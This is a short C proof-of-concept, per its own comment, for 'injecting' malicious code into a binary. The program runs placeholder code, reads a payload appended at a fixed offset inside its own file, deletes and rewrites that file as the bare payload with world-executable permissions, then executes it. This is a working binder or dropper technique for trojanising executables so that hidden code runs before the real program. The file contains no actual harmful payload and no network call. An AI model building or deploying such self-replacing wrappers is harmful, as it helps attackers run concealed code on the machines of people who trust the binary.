// A proof-of-concept of a method to 'inject' malicious code into a binary.
#include<stdio.h>
#include<stdlib.h>
#include<sys/types.h>
#include<sys/stat.h>
#include<fcntl.h>
#include<unistd.h>

#define PLD_BIN "payload"
#define IJN_BIN "injection"
#define IJN_NBYTES 17464
#define PLD_NBYTES 20000

char*
read_payload_binary(ssize_t* nbytes)
{
    int fd = open(IJN_BIN, O_RDONLY);
    if (fd < 0) {
        fprintf(stderr, "Couldn't open "IJN_BIN".\n");
        exit(1);
    }

    lseek(fd, IJN_NBYTES, SEEK_SET);

    char* payload = malloc(PLD_NBYTES);
    if (payload == NULL) {
        fprintf(stderr, "Out of memory :'(.\n");
        exit(1);
    }
    *nbytes = read(fd, payload, PLD_NBYTES);
    if (*nbytes <= 0) {
        fprintf(stderr, "No payload or failed to read payload.\n");
        exit(1);
    }
    close(fd);
    return payload;
}

void
replace_with_payload(char* payload, ssize_t nbytes_payload)
{
    remove(IJN_BIN);

    int fd = creat(IJN_BIN, S_IRWXU | S_IRWXG | S_IRWXO);
    if (fd < 0) {
        fprintf(stderr, "Couldn't open "IJN_BIN".\n");
        exit(1);
    }
    close(fd);

    fd = open(IJN_BIN, O_WRONLY);
    lseek(fd, 0, SEEK_SET);
    ssize_t bytes_wrote = write(fd, payload, nbytes_payload);
    if (bytes_wrote <= 0) {
        fprintf(stderr, "Failed to write the payload.\n");
        exit(1);
    }
    close(fd);
}

void
remove_injection_binary(void)
{
    ssize_t nbytes_payload = 0;

    char* payload = read_payload_binary(&nbytes_payload);

    replace_with_payload(payload, nbytes_payload);

    free(payload);
}

void
run_payload(void)
{
    char* newargv[] = { NULL };
    char* newenviron[] = { NULL };
    execve(IJN_BIN, newargv, newenviron);
}

int
main(void)
{
    printf("This could be some malicious code!\n");

    remove_injection_binary();

    run_payload();

    exit(1);
}
